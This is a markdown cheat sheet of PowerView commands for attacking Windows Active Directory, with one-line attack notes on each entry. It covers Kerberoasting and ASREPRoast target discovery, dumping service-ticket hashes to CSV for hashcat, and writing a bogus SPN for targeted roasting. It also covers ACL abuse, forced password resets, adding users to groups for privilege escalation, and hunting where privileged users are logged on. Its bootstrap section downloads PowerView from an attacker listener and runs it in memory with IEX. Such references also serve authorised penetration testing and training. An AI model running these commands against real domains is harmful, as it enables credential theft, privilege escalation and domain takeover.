# Powerview

## ldap - enum - powerview - get - local

### AdminCount users

Enumerate AdminCount users with Powerview.

Users with `adminCount=1`. Marks accounts protected by AdminSDHolder, i.e. (formerly) privileged.

```sh title:"Powerview Enumerate AdminCount Users"
Get-DomainUser * -AdminCount | select samaccountname,useraccountcontrol
```
<!-- cheat -->

### Unconstrained delegation users

Enumerate unconstrained delegation users with Powerview.

Users with the TRUSTED_FOR_DELEGATION UAC bit. Compromise often equals domain compromise.

```sh title:"Powerview Enumerate Unconstrained Delegation Users"
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```
<!-- cheat -->

### Constrained delegation users

Enumerate constrained delegation users with Powerview.

Users marked TrustedToAuth, i.e. configured for constrained delegation with protocol transition (S4U2Self/Proxy).

```sh title:"Powerview Enumerate Constrained Delegation Users"
Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof
```
<!-- cheat -->

### ASREPRoast candidates

Enumerate ASREPRoast candidates with Powerview.

Users with KerberosPreauthNotRequired set. AS-REP can be requested without creds and cracked offline.

```sh title:"Powerview Enumerate ASREPRoast Candidates"
Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof
```
<!-- cheat -->

### Unconstrained delegation computers

Enumerate unconstrained delegation computers with Powerview.

Computer accounts with TRUSTED_FOR_DELEGATION. Coerce + dump LSASS for any TGT that ever lands on them.

```sh title:"Powerview Enumerate Unconstrained Delegation Computers"
Get-DomainComputer -Unconstrained
```
<!-- cheat -->

### ACLs by SID

Enumerate ACLs by SID with Powerview.

Filter resolved ACLs to only those granted to a specific SID. Used after Convert-NameToSid to find what your principal can write.

```sh title:"Powerview Enumerate ACLs by SID"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```
<!-- cheat
var sid
-->

### Object ACL

Read object ACL with Powerview.

Read the DACL of one named object. Direct way to see who controls it.

```sh title:"Powerview Read Object ACL"
Get-DomainObjectAcl -Identity $user
```
<!-- cheat
var user
-->

### Constrained delegation computers

Enumerate constrained delegation computers with Powerview.

Computer accounts with TrustedToAuth (S4U2Self/Proxy). Often a privesc shortcut to any service hosted on them.

```sh title:"Powerview Enumerate Constrained Delegation Computers"
Get-DomainComputer -TrustedToAuth
```
<!-- cheat -->

## ldap - powerview - misc - local

### CSV export

Read CSV export with Powerview.

Thread-safe CSV append helper from PowerView. Handy when piping cmdlet output across runspaces.

```sh title:"Powerview Read CSV Export"
Export-PowerViewCSV
```
<!-- cheat -->

### Resolve hostname

Run resolve hostname with Powerview.

Resolve a hostname to an IP using PowerView's helper.

```sh title:"Powerview Run Resolve Hostname"
Resolve-IPAddress
```
<!-- cheat -->

### Convert name to SID

Convert name to SID with Powerview.

Convert a user/group name to a SID for ACL filtering and ticketer.

```sh title:"Powerview Convert Name to SID"
ConvertTo-SID
```
<!-- cheat -->

### Convert name to SID (var)

Convert name to SID (var) with Powerview.

Concrete one-liner that stores the SID into `$sid` for follow-on ACL queries.

```sh title:"Powerview Convert Name to SID (var)"
$sid = Convert-NameToSid $target_user
```
<!-- cheat
var target_user
-->

### Convert AD name format

Convert AD name format with Powerview.

Convert object names between sAMAccountName, UPN, DN, NT4, etc. Useful for switching identifier styles between tools.

```sh title:"Powerview Convert AD Name Format"
Convert-ADName
```
<!-- cheat -->

### Decode UAC value

Decode UAC value with Powerview.

Decode a userAccountControl integer into the named flags.

```sh title:"Powerview Decode UAC Value"
ConvertFrom-UACValue
```
<!-- cheat -->

### Add remote connection

Add remote connection with Powerview.

Mount a remote path with a supplied PSCredential. Lets cmdlets reach a host you don't have implicit creds for.

```sh title:"Powerview Add Remote Connection"
Add-RemoteConnection
```
<!-- cheat -->

### Remove remote connection

Remove remote connection with Powerview.

Drop a connection created by Add-RemoteConnection. Always pair the two so you don't leak mounted drives.

```sh title:"Powerview Remove Remote Connection"
Remove-RemoteConnection
```
<!-- cheat -->

### Impersonate user

Execute impersonate user with Powerview.

Spawn a `runas /netonly`-style logon and impersonate the resulting token. Pass-the-hash-friendly user impersonation.

```sh title:"Powerview Execute Impersonate User"
Invoke-UserImpersonation
```
<!-- cheat -->

### Revert impersonation

Run revert impersonation with Powerview.

Drop the impersonated token. Always pair with Invoke-UserImpersonation.

```sh title:"Powerview Run Revert Impersonation"
Invoke-RevertToSelf
```
<!-- cheat -->

### Request SPN ticket

Run request SPN ticket with Powerview.

Request a Kerberos service ticket for one SPN. Stepping stone to manual Kerberoasting.

```sh title:"Powerview Run Request SPN Ticket"
Get-DomainSPNTicket
```
<!-- cheat -->

### Invoke-Kerberoast

Run invoke kerberoast with Powerview.

Auto Kerberoast every reachable SPN-enabled account and return crackable hashes.

```sh title:"Powerview Run Invoke Kerberoast"
Invoke-Kerberoast
```
<!-- cheat -->

### Path ACLs

Run path ACLs with Powerview.

Read filesystem ACLs on a path with optional group recursion. Useful for finding writable paths via group nesting.

```sh title:"Powerview Run Path ACLs"
Get-PathAcl
```
<!-- cheat -->

## ldap - powerview - domain - local

### DNS zones

List DNS zones with Powerview.

List ADIDNS zones in the domain.

```sh title:"Powerview List DNS Zones"
Get-DomainDNSZone
```
<!-- cheat -->

### DNS records

List DNS records with Powerview.

List DNS records in a given ADIDNS zone.

```sh title:"Powerview List DNS Records"
Get-DomainDNSRecord
```
<!-- cheat -->

### Domain

Run domain with Powerview.

Return the domain for the current (or specified) domain.

```sh title:"Powerview Run Domain"
Get-Domain
```
<!-- cheat -->

### Domain controllers

Run domain controllers with Powerview.

Return the DCs for the current (or specified) domain.

```sh title:"Powerview Run Domain Controllers"
Get-DomainController
```
<!-- cheat -->

### Forest object

Run forest object with Powerview.

Return the forest object for the current forest.

```sh title:"Powerview Run Forest Object"
Get-Forest
```
<!-- cheat -->

### Forest domains

Run forest domains with Powerview.

Return all domains within the current forest.

```sh title:"Powerview Run Forest Domains"
Get-ForestDomain
```
<!-- cheat -->

### Global catalogs

Read global catalogs with Powerview.

Return all global catalog servers in the forest.

```sh title:"Powerview Read Global Catalogs"
Get-ForestGlobalCatalog
```
<!-- cheat -->

### Outlier objects

Find outlier objects with Powerview.

Find users/groups/computers with attribute values that deviate from the population (anomaly detection).

```sh title:"Powerview Find Outlier Objects"
Find-DomainObjectPropertyOutlier
```
<!-- cheat -->

### Domain users

Run domain users with Powerview.

Return all users (or one specific user) from the domain.

```sh title:"Powerview Run Domain Users"
Get-DomainUser
```
<!-- cheat -->

### TGS hashcat for user

Crack TGS hashcat for user with Powerview.

Pull a TGS for a user and format the hash for hashcat (mode 13100).

```sh title:"Powerview Crack TGS Hashcat for User"
Get-DomainUser -Identity $user | Get-DomainSPNTicket -Format Hashcat
```
<!-- cheat
var user
-->

### List SPN holders

List SPN holders with Powerview.

List every user with an SPN set (Kerberoast target list).

```sh title:"Powerview List SPN Holders"
Get-DomainUser * -spn | select samaccountname
```
<!-- cheat -->

### Bulk Kerberoast to CSV

Crack bulk kerberoast to CSV with Powerview.

Roast every SPN account and dump hashcat-formatted hashes into a CSV.

```sh title:"Powerview Crack Bulk Kerberoast to CSV"
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\users_tgs.csv -NoTypeInformation
```
<!-- cheat -->

### New domain user

Create domain user with Powerview.

Create a new domain user (assuming the appropriate write rights).

```sh title:"Powerview Create Domain User"
New-DomainUser
```
<!-- cheat -->

### Set user password

Set user password with Powerview.

Reset a domain user's password (cmdlet form, requires reset rights).

```sh title:"Powerview Set User Password"
Set-DomainUserPassword
```
<!-- cheat -->

### User logon events

Run user logon events with Powerview.

Enumerate 4624 / 4648 logon events for the named user. Maps where the user has authenticated.

```sh title:"Powerview Run User Logon Events"
Get-DomainUserEvent
```
<!-- cheat -->

### Domain computers

Run domain computers with Powerview.

Return all (or specified) computer objects.

```sh title:"Powerview Run Domain Computers"
Get-DomainComputer
```
<!-- cheat -->

### Domain object

Run domain object with Powerview.

Return all (or specified) AD objects regardless of class.

```sh title:"Powerview Run Domain Object"
Get-DomainObject
```
<!-- cheat -->

### Set SPN on user

Set SPN on user with Powerview.

Write a fake SPN onto a user. Triggers targeted Kerberoasting; leave the SPN bogus to avoid breaking anything real.

```sh title:"Powerview Set SPN on User"
Set-DomainObject -Identity $user -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
```
<!-- cheat
var user
-->

### Object ACLs

Read object ACLs with Powerview.

Read the DACL of an AD object.

```sh title:"Powerview Read Object ACLs"
Get-DomainObjectAcl
```
<!-- cheat -->

### Add object ACL

Add object ACL with Powerview.

Add an ACE to an AD object's DACL (privesc setup).

```sh title:"Powerview Add Object ACL"
Add-DomainObjectAcl
```
<!-- cheat -->

### Interesting ACLs

Run interesting ACLs with Powerview.

Find ACEs in the domain granted to non-builtin principals (typical privesc paths).

```sh title:"Powerview Run Interesting ACLs"
Find-InterestingDomainAcl
```
<!-- cheat -->

### OUs

List OUs with Powerview.

List OUs.

```sh title:"Powerview List OUs"
Get-DomainOU
```
<!-- cheat -->

### Sites

List sites with Powerview.

List AD sites.

```sh title:"Powerview List Sites"
Get-DomainSite
```
<!-- cheat -->

### Subnets

List subnets with Powerview.

List AD-defined subnets.

```sh title:"Powerview List Subnets"
Get-DomainSubnet
```
<!-- cheat -->

### Domain SID

Run domain SID with Powerview.

Return the domain SID. Required for ticketer (silver/golden) and SID-history.

```sh title:"Powerview Run Domain SID"
Get-DomainSID
```
<!-- cheat -->

### Domain groups

Run domain groups with Powerview.

Return all (or specified) domain groups.

```sh title:"Powerview Run Domain Groups"
Get-DomainGroup
```
<!-- cheat -->

### New group

Create group with Powerview.

Create a new domain group (requires write rights).

```sh title:"Powerview Create Group"
New-DomainGroup
```
<!-- cheat -->

### Managed groups

Write managed groups with Powerview.

Find security groups that have a `managedBy` set. The manager often has implicit write rights to membership.

```sh title:"Powerview Write Managed Groups"
Get-DomainManagedSecurityGroup
```
<!-- cheat -->

### Group members

List group members with Powerview.

List members of a domain group.

```sh title:"Powerview List Group Members"
Get-DomainGroupMember
```
<!-- cheat -->

### Add to group

Add Powerview to group.

Add a user/group to an existing domain group.

```sh title:"Powerview Add to Group"
Add-DomainGroupMember
```
<!-- cheat -->

### File servers

Start file servers with Powerview.

Return likely file servers in the domain (based on SPNs).

```sh title:"Powerview Start File Servers"
Get-DomainFileServer
```
<!-- cheat -->

### DFS shares

Run DFS shares with Powerview.

Return all fault-tolerant DFS namespaces.

```sh title:"Powerview Run DFS Shares"
Get-DomainDFSShare
```
<!-- cheat -->

## ldap - powerview - gpo - local

### GPO objects

Run GPO objects with Powerview.

Return all (or specified) GPO objects.

```sh title:"Powerview Run GPO Objects"
Get-DomainGPO
```
<!-- cheat -->

### GPO local groups

Set GPO local groups with Powerview.

GPOs that modify local group memberships via Restricted Groups / GPP.

```sh title:"Powerview Set GPO Local Groups"
Get-DomainGPOLocalGroup
```
<!-- cheat -->

### Map user to local groups

Run map user to local groups with Powerview.

For a user/group, map every machine where GPO grants them local-group membership. Quick way to find lateral movement targets.

```sh title:"Powerview Run Map User to Local Groups"
Get-DomainGPOUserLocalGroupMapping
```
<!-- cheat -->

### Map computer's local groups

Run map computer's local groups with Powerview.

For a computer (or GPO), map who is in its local groups via GPO correlation.

```sh title:"Powerview Run Map Computer's Local Groups"
Get-DomainGPOComputerLocalGroupMapping
```
<!-- cheat -->

### Default policy

Run default policy with Powerview.

Return the Default Domain or DC policy.

```sh title:"Powerview Run Default Policy"
Get-DomainPolicy
```
<!-- cheat -->

## ldap - enumeration - powerview - computer - local

### Local groups

Enumerate local groups with Powerview.

Enumerate local groups on the local or remote machine.

```sh title:"Powerview Enumerate Local Groups"
Get-NetLocalGroup
```
<!-- cheat -->

### Local group members

Enumerate local group members with Powerview.

Members of a specific local group on the local or remote machine.

```sh title:"Powerview Enumerate Local Group Members"
Get-NetLocalGroupMember
```
<!-- cheat -->

### Net shares

Enumerate net shares with Powerview.

Open shares on the local or remote machine.

```sh title:"Powerview Enumerate Net Shares"
Get-NetShare
```
<!-- cheat -->

### Logged on users

Enumerate logged on users with Powerview.

Users logged on the local or remote machine (NetWkstaUserEnum).

```sh title:"Powerview Enumerate Logged on Users"
Get-NetLoggedon
```
<!-- cheat -->

### Net sessions

Show net sessions with Powerview.

Session info on the local or remote machine (NetSessionEnum). Maps where users are coming from.

```sh title:"Powerview Show Net Sessions"
Get-NetSession
```
<!-- cheat -->

### Reg logged on

Enumerate reg logged on with Powerview.

Who's logged on, derived from remote registry hive paths under HKU.

```sh title:"Powerview Enumerate Reg Logged on"
Get-RegLoggedOn
```
<!-- cheat -->

### RDP sessions

Enumerate RDP sessions with Powerview.

Remote Desktop / Terminal Services sessions on the local or remote machine.

```sh title:"Powerview Enumerate RDP Sessions"
Get-NetRDPSession
```
<!-- cheat -->

### Test admin access

Enumerate test admin access with Powerview.

Test whether the current user has local admin on the target. Required for many post-exploitation primitives.

```sh title:"Powerview Enumerate Test Admin Access"
Test-AdminAccess
```
<!-- cheat -->

### Computer site

Enumerate computer site with Powerview.

Return the AD site that the local or remote machine is in.

```sh title:"Powerview Enumerate Computer Site"
Get-NetComputerSiteName
```
<!-- cheat -->

### WPAD / proxy

Read WPAD / proxy with Powerview.

Read WPAD / proxy config from the registry.

```sh title:"Powerview Read WPAD / Proxy"
Get-WMIRegProxy
```
<!-- cheat -->

### Last logged-on user

Enumerate last logged on user with Powerview.

Return the last interactive logon recorded in the registry.

```sh title:"Powerview Enumerate Last Logged on User"
Get-WMIRegLastLoggedOn
```
<!-- cheat -->

### Cached RDP connections

Enumerate cached RDP connections with Powerview.

RDP MRU history from the registry. Maps where users RDP from.

```sh title:"Powerview Enumerate Cached RDP Connections"
Get-WMIRegCachedRDPConnection
```
<!-- cheat -->

### Mounted drives

Enumerate mounted drives with Powerview.

Saved network mounted drives from the registry. Often points to file servers / shares with creds saved.

```sh title:"Powerview Enumerate Mounted Drives"
Get-WMIRegMountedDrive
```
<!-- cheat -->

### Process list with owners

List process list with owners with Powerview.

Process list with their owner SIDs via WMI.

```sh title:"Powerview List Process List with Owners"
Get-WMIProcess
```
<!-- cheat -->

### Find files

Find files with Powerview.

Search a path for files matching name / size / age criteria.

```sh title:"Powerview Find Files"
Find-InterestingFile
```
<!-- cheat -->

## ldap - powerview - meta - local

### Find user logon

Find user logon with Powerview.

Find domain machines where the named user is currently logged in. Hunt mode for high-value users.

```sh title:"Powerview Find User Logon"
Find-DomainUserLocation
```
<!-- cheat -->

### Find process

Find process with Powerview.

Find domain machines running a named process.

```sh title:"Powerview Find Process"
Find-DomainProcess
```
<!-- cheat -->

### Find user events

Find user events with Powerview.

Find logon events for named users across the domain.

```sh title:"Powerview Find User Events"
Find-DomainUserEvent
```
<!-- cheat -->

### Find shares

Find shares with Powerview.

Find reachable SMB shares on domain machines.

```sh title:"Powerview Find Shares"
Find-DomainShare
```
<!-- cheat -->

### Find share files

Find share files with Powerview.

Search readable domain shares for files matching criteria. Pair with Find-DomainShare.

```sh title:"Powerview Find Share Files"
Find-InterestingDomainShareFile
```
<!-- cheat -->

### Find local admin

Find local admin with Powerview.

Find machines where the current user has local admin. The lateral movement candidate list.

```sh title:"Powerview Find Local Admin"
Find-LocalAdminAccess
```
<!-- cheat -->

### Domain local group members

Run domain local group members with Powerview.

Enumerate local-group membership on domain machines for a named local group.

```sh title:"Powerview Run Domain Local Group Members"
Find-DomainLocalGroupMember
```
<!-- cheat -->

## ldap - powerview - domain trusts - local

### Domain trusts

Run domain trusts with Powerview.

Return all domain trusts for the current or specified domain.

```sh title:"Powerview Run Domain Trusts"
Get-DomainTrust
```
<!-- cheat -->

### Forest trusts

Run forest trusts with Powerview.

Return all forest trusts.

```sh title:"Powerview Run Forest Trusts"
Get-ForestTrust
```
<!-- cheat -->

### Foreign users

Run foreign users with Powerview.

Users in groups outside the user's home domain. Cross-trust privesc indicator.

```sh title:"Powerview Run Foreign Users"
Get-DomainForeignUser
```
<!-- cheat -->

### Foreign group members

Run foreign group members with Powerview.

Groups containing members from another domain. Maps where cross-domain trust gives access.

```sh title:"Powerview Run Foreign Group Members"
Get-DomainForeignGroupMember
```
<!-- cheat -->

### Trust mapping

Start trust mapping with Powerview.

Recursive trust enumeration starting at the current domain. Builds a full trust map.

```sh title:"Powerview Start Trust Mapping"
Get-DomainTrustMapping
```
<!-- cheat -->

### Reset password

Dump reset password with Powerview.

Concrete password reset oneliner using a SecureString.

```sh title:"Powerview Dump Reset Password"
$newpass = ConvertTo-SecureString '$target_pass' -AsPlainText -Force; Set-DomainUserPassword -Identity $target_user -AccountPassword $newpass -Verbose
```
<!-- cheat
var target_user
var target_pass
-->

### Add user to group

Add user to group with Powerview.

Add a user to a group (privesc finalization step after ACL writes).

```sh title:"Powerview Add User to Group"
Add-DomainGroupMember -Identity $group_name -Members $user -Verbose
```
<!-- cheat
var group_name
var user
-->

### Confirm membership

Read confirm membership with Powerview.

Read membership back to confirm the add succeeded.

```sh title:"Powerview Read Confirm Membership"
Get-DomainGroupMember -Identity $group_name | select MemberName
```
<!-- cheat
var group_name
-->

### Clear SPNs

Run clear SPNs with Powerview.

Remove all SPNs from a user (cleanup after targeted Kerberoasting).

```sh title:"Powerview Run Clear SPNs"
Set-DomainObject -Identity $user -Clear serviceprincipalname -Verbose
```
<!-- cheat
var user
-->

### Remove from group

Remove Powerview from group.

Remove a user from a group (cleanup after privesc).

```sh title:"Powerview Remove from Group"
Remove-DomainGroupMember -Identity $group_name -Members $user -Verbose
```
<!-- cheat
var group_name
var user
-->

## powerview - bootstrap

### In-memory load

Start Powerview in memory load.

Pull PowerView from an attacker HTTP listener and load it directly into the current PowerShell session - no disk drop.

```powershell title:"Powerview Start in Memory Load"
(New-Object Net.WebClient).DownloadString('$scheme://$lhost:$lport/PowerView.ps1') | IEX
```
<!-- cheat
import tun_ip
import lports
import scheme
-->

### Build PSCredential object

Build PSCredential object with Powerview.

Build a `[PSCredential]` object for the `-Credential` parameter on any PowerView cmdlet (or any PowerShell cmdlet).

```powershell title:"Powerview Build PSCredential Object"
$passwd = ConvertTo-SecureString '$pass' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ('$domain\$user', $passwd)
```
<!-- cheat
import domain_ip
var user
var pass
-->

### Convert SID to name

Convert SID to name with Powerview.

Translate a SID string into the matching domain principal.

```powershell title:"Powerview Convert SID to Name"
ConvertFrom-SID $sid
```
<!-- cheat
var sid
-->

### Find managed security groups

Find managed security groups with Powerview.

Lists security groups where non-admin users have been granted Manage rights — common privesc path via group membership.

```powershell title:"Powerview Find Managed Security Groups"
Find-ManagedSecurityGroups | select GroupName
```
<!-- cheat -->

